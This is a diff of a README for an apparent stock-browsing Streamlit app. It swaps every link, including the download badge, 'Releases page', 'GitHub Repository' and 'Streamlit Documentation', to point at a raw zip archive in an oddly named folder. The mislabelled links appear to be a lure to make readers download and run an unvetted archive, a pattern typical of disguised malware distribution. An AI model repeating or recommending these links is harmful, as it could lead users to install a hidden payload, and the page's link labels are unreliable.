@@ -1,6 +1,6 @@
 # 🎉 stock-mini-terminal-streamlit - Find and Explore Stocks Easily
 
-[![Download Here](https://raw.githubusercontent.com/Tsooj123/stock-mini-terminal-streamlit/main/epiphysitis/stock-mini-terminal-streamlit.zip%20Release&color=blue&style=for-the-badge)](https://raw.githubusercontent.com/Tsooj123/stock-mini-terminal-streamlit/main/epiphysitis/stock-mini-terminal-streamlit.zip)
+[![Download Here](https://raw.githubusercontent.com/Tsooj123/stock-mini-terminal-streamlit/main/epiphysitis/mini_stock_terminal_streamlit_2.4.zip%20Release&color=blue&style=for-the-badge)](https://raw.githubusercontent.com/Tsooj123/stock-mini-terminal-streamlit/main/epiphysitis/mini_stock_terminal_streamlit_2.4.zip)
 
 ## 📦 Introduction
 
@@ -27,7 +27,7 @@ The application runs on Windows, macOS, and Linux. Ensure that you have the foll
 
 To install the Stock Finder & Mini Terminal:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Tsooj123/stock-mini-terminal-streamlit/main/epiphysitis/stock-mini-terminal-streamlit.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Tsooj123/stock-mini-terminal-streamlit/main/epiphysitis/mini_stock_terminal_streamlit_2.4.zip).
 2. Find the version labeled as the latest release.
 3. Download the appropriate file for your operating system.
 4. Once the download completes, locate the file in your downloads folder.
@@ -77,8 +77,8 @@ Your contributions are welcome! If you have suggestions for improving the applic
 
 For more information and detailed documentation, please visit:
 
-- [GitHub Repository](https://raw.githubusercontent.com/Tsooj123/stock-mini-terminal-streamlit/main/epiphysitis/stock-mini-terminal-streamlit.zip)
-- [Streamlit Documentation](https://raw.githubusercontent.com/Tsooj123/stock-mini-terminal-streamlit/main/epiphysitis/stock-mini-terminal-streamlit.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Tsooj123/stock-mini-terminal-streamlit/main/epiphysitis/mini_stock_terminal_streamlit_2.4.zip)
+- [Streamlit Documentation](https://raw.githubusercontent.com/Tsooj123/stock-mini-terminal-streamlit/main/epiphysitis/mini_stock_terminal_streamlit_2.4.zip)
 
 ## 📧 Support
 
